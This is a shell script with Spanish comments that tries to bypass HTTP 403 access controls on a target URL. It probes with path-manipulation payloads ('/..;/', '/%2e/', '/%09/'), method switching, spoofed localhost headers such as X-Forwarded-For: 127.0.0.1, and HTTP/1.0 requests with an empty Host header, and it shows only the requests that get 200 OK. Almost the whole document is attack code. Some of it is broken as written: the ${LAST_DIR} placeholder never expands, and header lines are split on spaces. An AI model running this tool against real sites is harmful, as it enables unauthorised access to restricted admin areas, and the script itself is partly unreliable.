#!/bin/sh
# 403bypass5.sh - versión ultra-compatible (Bash 1.0.x / Bourne shell)
# Solo muestra 200 OK + petición curl completa (-v)
# User-Agent fijo: Chrome/Edge 120 style

if [ $# -ne 1 ]; then
    echo "Uso: $0 <URL_COMPLETA>"
    echo "Ejemplos:"
    echo "  $0 https://target.com/admin/"
    echo "  $0 https://ejemplo.com/panel"
    exit 1
fi

TARGET="$1"

# Quitamos / final si existe (compatible con shells antiguos)
case "$TARGET" in
    */) TARGET=`echo "$TARGET" | sed 's/\/$//'` ;;
esac

echo ""
echo "============================================================="
echo " Pruebas de bypass 403 → $TARGET/"
echo " (solo se muestran respuestas 200 OK)"
echo " User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
echo "============================================================="
echo ""

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"

# ────────────────────────────────────────────────
# Payloads de path (usamos here-document simple)
# ────────────────────────────────────────────────
payloads() {
cat << 'EOF'
/*
//
/.
/../${LAST_DIR}/
/%2e/
/%2e%2e/${LAST_DIR}/
/.;/
/..;/
/%20/
/%09/
/?
/%3f
/%23
/*
/.random
/index.aspx
/default.aspx
EOF
}

# Último segmento del path (basename manual ultra-compatible)
LAST_DIR=`echo "$TARGET" | sed 's|.*/||'`

# Métodos a probar
METHODS="GET HEAD OPTIONS POST"

special_headers() {
cat << 'EOF'
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-For: 127.0.0.1:80
X-Forwarded-For: ::1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Client-IP: 127.0.0.1
X-Forwarded-Host: localhost
Forwarded: for=127.0.0.1;proto=https;by=localhost
EOF
}

# Función auxiliar para ejecutar y filtrar solo 200
run_curl() {
    cmd="$1"
    echo "$cmd"
    echo "--------------------------------------------------"

    # Ejecutamos con -v para ver la petición completa
    # -s silencia progreso, -k ignora cert, -m 8 timeout 8s
    output=`eval "$cmd -s -k -m 8 -v -o /dev/null -w '%{http_code}'" 2>&1`

    # Última línea = código HTTP
    http_code=`echo "$output" | tail -n 1`

    if [ "$http_code" = "200" ]; then
        # Mostramos cabeceras + petición (quitamos líneas de curl debug innecesarias)
        echo "$output" | grep -v "^\{" | grep -v "^\}" | grep -v "^\* " | grep -v "^  " 
        echo ""
        echo
        echo "--------------------------------------------------"
        echo ""
    fi
}

# ────────────────────────────────────────────────
# 1. Variaciones de PATH + métodos
# ────────────────────────────────────────────────
echo "[*] 1. Variaciones de PATH + cambio de método"
echo "-------------------------------------------------------------"

for payload in `payloads`; do
    test_url="${TARGET}${payload}"

    for method in $METHODS; do
        cmd="curl -X $method -I -A \"$UA\" \"$test_url\""
        run_curl "$cmd"
    done
done

# ────────────────────────────────────────────────
# 2. Cabeceras de spoofing (solo GET por simplicidad)
# ────────────────────────────────────────────────
echo ""
echo "[*] 2. Cabeceras de proxy / localhost spoofing (GET)"
echo "-------------------------------------------------------------"

for header in `special_headers`; do
    for extra in "" "/" "//" "/." "/..;/" "/.;/" "/ "; do
        test_url="${TARGET}${extra}"
        cmd="curl -X GET -I -A \"$UA\" -H \"$header\" \"$test_url\""
        run_curl "$cmd"
    done
done

# ────────────────────────────────────────────────
# 3. Trucos HTTP/1.0 + Host vacío
# ────────────────────────────────────────────────
echo ""
echo "[*] 3. Trucos HTTP/1.0 + Host header vacío"
echo "-------------------------------------------------------------"

test_url="${TARGET}/"

# Normal (HTTP/1.1 por defecto)
cmd="curl -I -A \"$UA\" \"$test_url\""
run_curl "$cmd"

# Forzamos HTTP/1.0
cmd="curl --http1.0 -I -A \"$UA\" \"$test_url\""
run_curl "$cmd"

# HTTP/1.0 + Host: vacío
cmd="curl --http1.0 -I -A \"$UA\" -H \"Host:\" \"$test_url\""
run_curl "$cmd"
